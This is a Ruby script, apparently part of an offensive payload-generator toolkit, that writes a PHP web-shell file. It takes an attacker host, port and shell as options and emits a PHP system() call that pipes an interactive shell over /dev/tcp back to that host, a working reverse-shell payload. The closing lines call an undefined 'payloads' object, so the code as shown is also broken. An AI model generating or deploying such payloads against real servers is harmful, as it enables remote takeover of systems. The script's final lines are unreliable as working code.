#!/usr/bin/env ruby

i = "\033[1;77m[i] \033[0m"
e = "\033[1;31m[-] \033[0m"
p = "\033[1;77m[>] \033[0m"
g = "\033[1;34m[*] \033[0m"
s = "\033[1;32m[+] \033[0m"
h = "\033[1;77m[@] \033[0m"
r = "\033[1;77m[#] \033[0m"

require 'optparse'
require 'ostruct'

Signal.trap("INT") {
    abort()
}

options = OpenStruct.new
OptionParser.new do |opt|
    opt.on('-l', '--local-host <local_host>', 'Local host.') { |o| options.local_host = o }
    opt.on('-p', '--local-port <local_port>', 'Local port.') { |o| options.local_port = o }
    opt.on('-s', '--target-shell <target_shell>', 'Target shell.') { |o| options.target_shell = o }
    opt.on('-o', '--output-path <output_path>', 'Output path.') { |o| options.output_path = o }
    opt.on('-h', '--help', "Show options.") do
        puts "Usage: php.rb [-h] --local-host=<local_host> --local-port=<local_port>"
        puts "              --target-shell=<target_shell> --output-path=<output_path>"
        puts ""
        puts "  -h, --help                     Show options."
        puts "  --local-host=<local_host>      Local host."
        puts "  --local-port=<local_port>      Local port."
        puts "  --target-shell=<target_shell>  Target shell."
        puts "  --output-path=<output_path>    Output path."
        abort()
    end
end.parse!

host = options.local_host
port = options.local_port
shell = options.target_shell
file = options.output_path

if not host or not port or not shell or not file
    puts "Usage: php.rb [-h] --local-host=<local_host> --local-port=<local_port>"
    puts "              --target-shell=<target_shell> --output-path=<output_path>"
    puts ""
    puts "  -h, --help                     Show options."
    puts "  --local-host=<local_host>      Local host."
    puts "  --local-port=<local_port>      Local port."
    puts "  --target-shell=<target_shell>  Target shell."
    puts "  --output-path=<output_path>    Output path."
    abort()
end
  
payload = ""
payload += "<?php\n"
payload += "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");\n"
payload += "?>\n"

payload_handler = payloads.new
payloads.generate_payload(file, payload)
